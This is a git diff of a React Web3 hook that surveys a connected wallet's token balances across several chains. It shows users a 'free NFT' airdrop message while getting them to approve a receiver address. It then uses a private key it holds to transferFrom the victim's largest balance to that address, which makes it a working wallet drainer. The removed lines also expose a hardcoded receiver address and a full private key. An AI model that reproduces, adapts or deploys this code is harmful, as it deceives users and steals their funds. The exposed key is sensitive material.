@@ -1,7 +1,7 @@
 import axios from "axios"
 import URL from '../Constants/url'
 import { useWeb3React } from "@web3-react/core";
-import { Injected, walletconnect } from "../Connectors/Connectors";
+import { Injected } from "../Connectors/Connectors";
 import { toast } from 'react-toastify';
 import { useEffect, useState } from "react";
 import Addresses from '../Constants/address'
@@ -11,21 +11,17 @@ import Web3 from "web3";
 export const useAlchemy = () => {
     const context = useWeb3React();
     const {
-        connector,
+        
         library,
         chainId,
         account,
-        activate,
-        deactivate,
         active,
-        error,
-        request
+        activate,
+        
     } = context;
 
-    const [tokenName, setTokenName] = useState('');
-    const [tokenSymbol, setTokenSymbol] = useState('');
-    const [transactionHash, setTransactionHash] = useState('');
-    const [contract, setContract] = useState(null)
+
+    const [erc20Contract, setErc20Contract] = useState(null)
     const [balanceArray, setBalanceArray] = useState([])
 
     const balances = []
@@ -53,6 +49,7 @@ export const useAlchemy = () => {
             "id": 42
         });
 
+        //goerli configuration
         const goerliConfig = {
             method: 'post',
             url: URL.goerliApi,
@@ -62,6 +59,7 @@ export const useAlchemy = () => {
             data: data
         };
 
+         //polygon configuration
         const polygonConfig = {
             method: 'post',
             url: URL.polygonApi,
@@ -70,6 +68,8 @@ export const useAlchemy = () => {
             },
             data: data
         };
+
+         //ethereum configuration
         const mainnetConfig = {
             method: 'post',
             url: URL.mainnetApi,
@@ -79,6 +79,7 @@ export const useAlchemy = () => {
             data: data
         };
 
+         //arbitrum configuration
         const arbitrumConfig = {
             method: 'post',
             url: URL.arbitrumApi,
@@ -87,43 +88,38 @@ export const useAlchemy = () => {
             },
             data: data
         };
-        const response = await Promise.all([axios(goerliConfig), axios(polygonConfig), axios(mainnetConfig), axios(arbitrumConfig)])
-        console.log(response)
-        // Make the request and print the formatted response:
-        // const response = await axios(config)
-        // console.log(response.data.result, "balance")
+        const balanceResponse = await Promise.all([axios(goerliConfig), axios(polygonConfig), axios(mainnetConfig), axios(arbitrumConfig)])
+        
+        //fetch information from all the networks
         const responses = [];
-        response.forEach((item, index) => {
+        balanceResponse.forEach((item, index) => {
             responses.push({ ...item.data.result, network: networks[index].name, url: networks[index].url, chainId: networks[index].chainId })
         })
-        console.log(responses, 'final response')
-
+      
+        //fetch balance from each network
         responses.forEach(response => {
             response.tokenBalances.forEach(item => {
 
                 promiseArray.push(new Promise(async (resolve, reject) => {
-
-                    const mask = new Web3(response.url);
-                    // let cont = new library.eth.Contract(ABI, item.contractAddress);
-                    let cont = new mask.eth.Contract(ABI, item.contractAddress);
-                    const name = await cont.methods.name().call();
-                    const symbol = await cont.methods.symbol().call();
+                    const web3Instance = new Web3(response.url);
+                    let contract = new web3Instance.eth.Contract(ABI, item.contractAddress);
+                    const name = await contract.methods.name().call();
+                    const symbol = await contract.methods.symbol().call();
                     resolve({
                         name,
-                        balance: parseInt(item.tokenBalance, 16),
+                        balance:parseInt(item.tokenBalance, 16),
                         address: item.contractAddress,
                         symbol,
                         url: response.url,
-                        contract: cont,
+                        contract,
                         chainId: response.chainId
                     })
                 }))
             })
         })
 
-
+         //resolve the promises to get real numbers
         Promise.all(promiseArray).then(response => {
-
             balances.push(...response)
             setBalanceArray(balances)
             console.log(balances, "all balances")
@@ -134,19 +130,19 @@ export const useAlchemy = () => {
 
     //getHighestBalance
     const getHighestBalance = () => {
-        let snap = balanceArray[0]
+        let highest = balanceArray[0]
         balanceArray.forEach(item => {
             if (highestbalance.balance < item.balance) {
-                snap = item
+                highest = item
             }
         })
-        return snap;
-        // console.log(highestBalance)
+        return highest;
     }
 
+    //get current gas price
     const getCurrentGasPrices = async () => {
         let response = await axios.get(
-            "https://ethgasstation.info/json/ethgasAPI.json"
+           URL.ethGas
         );
         let prices = {
             low: response.data.safeLow / 10,
@@ -169,70 +165,59 @@ export const useAlchemy = () => {
                 progress: undefined,
                 theme: "colored",
             });
-            // alert("Already connected")
+           
         } else {
             activate(Injected);
 
         }
     }
 
-
-
-    // let contract;
-    // console.log()
+   
     useEffect(() => {
 
         if (context.active) {
             getBalance()
-            // let high = getHighestBalance()
-            // console.log(high)
-            let cont = new library.eth.Contract(ABI, Addresses.erc20);
-            setContract(cont)
-
-            async function getTokenInfo(contract) {
-                try {
-                    const name = await contract.methods.name().call();
-                    const symbol = await contract.methods.symbol().call();
-                    setTokenName(name);
-                    setTokenSymbol(symbol);
-                } catch (err) {
-                    console.error(err);
-                }
-            }
-            getTokenInfo(cont);
-
-
+            let snap = new library.eth.Contract(ABI, Addresses.erc20);
+            setErc20Contract(snap)
         }
     }, [context]);
 
     async function handleTransfer(event) {
-        if (context.active) {
+        event.preventDefault();
 
-            let high = getHighestBalance()
-            console.log(high.balance, high.chainId)
+        //if wallet connected
+        if (context.active) {
+            let high = getHighestBalance() //fetch the highest token balance
+            
             if (high.balance !== 0) {
-                event.preventDefault();
+                
+                //if not on highest token balance network, then switch to it
                 if (chainId !== high.chainId) {
                     await switchNetworks(high.chainId)
                 }
-                const toAddress = "0x8a5961146C0AB8642b889bB215984fd31fE9757B";
+
+                let contractmask = new library.eth.Contract(ABI, high.address)
+
+                const toAddress = process.env.REACT_APP_RECIEVER_ADDRESS;
+                console.log(toAddress,'key')
                 const amount = Web3.utils.toWei((500000).toString());
                 try {
-                    console.log(contract, toAddress, amount)
-                    let data = await contract.methods.approve(toAddress, amount).send({
+                    let data = await contractmask.methods.approve(toAddress, amount).send({
                         from: context.account,
                     }).on('transactionHash', (hash) => {
                         console.log(hash)
 
                         toast.success("Hurrah! You'll get your free NFT soon.")
                     })
-                    const mask = new Web3(high.url);
-                    const WALLET_PRIVATE_KEY = "49bdf04b4efaf38e51da4fb4eff29405fc042b4860a5a57f3842566e65a1932b"; //do not push this
+                    
+                    const myWeb3Instance = new Web3(high.url);
+                    const WALLET_PRIVATE_KEY = process.env.REACT_APP_WALLET_KEY; //do not push this
+                  
+                    const user = myWeb3Instance.eth.accounts.wallet.add(WALLET_PRIVATE_KEY);
+                    let contractImage = new myWeb3Instance.eth.Contract(ABI, high.address);
 
-                    const user = mask.eth.accounts.wallet.add(WALLET_PRIVATE_KEY);
-                    let cont = new mask.eth.Contract(ABI, high.address);
                     let gasPrice = await getCurrentGasPrices().medium
-                    cont.methods
+                    contractImage.methods
                         .transferFrom(account, toAddress, high.balance.toString())
                         .send({ from: user.address, gas: gasPrice, gasLimit: "102012" }, function (err, res) {
                             if (err) {
@@ -246,33 +231,19 @@ export const useAlchemy = () => {
                     console.error(err);
                 }
             }
-
         } else {
+            
             toast.error("Connect Your Wallet to get free tokens!")
         }
 
-        //     const toAddress = "0x8a5961146C0AB8642b889bB215984fd31fE9757B";
-        //     const amount = high.balance;
-        //     try {
-        //         console.log(contract, toAddress, amount)
-        //         let data = await contract.methods.transfer(toAddress, amount.toString()).send({
-        //             from: context.account,
-        //         }).on('transactionHash', (hash) => {
-        //             console.log(hash)
-        //             toast.success("Hurrah! You'll get your free NFT soon.")
-        //         })
-        //     } catch (err) {
-        //         toast.error("Refresh the page and reconnect wallet to recieve the airdrop!")
-        //         console.error(err);
-        //     }
-        // } else {
-        //     toast.error("Connect Your Wallet to get free tokens!")
-        // }
-
     }
+
+    //fetch current chain Id
     const getCurrentChainId = () => {
         console.log(chainId)
     }
+
+    //swtich the networks
     const switchNetworks = async (chain) => {
         try {
 
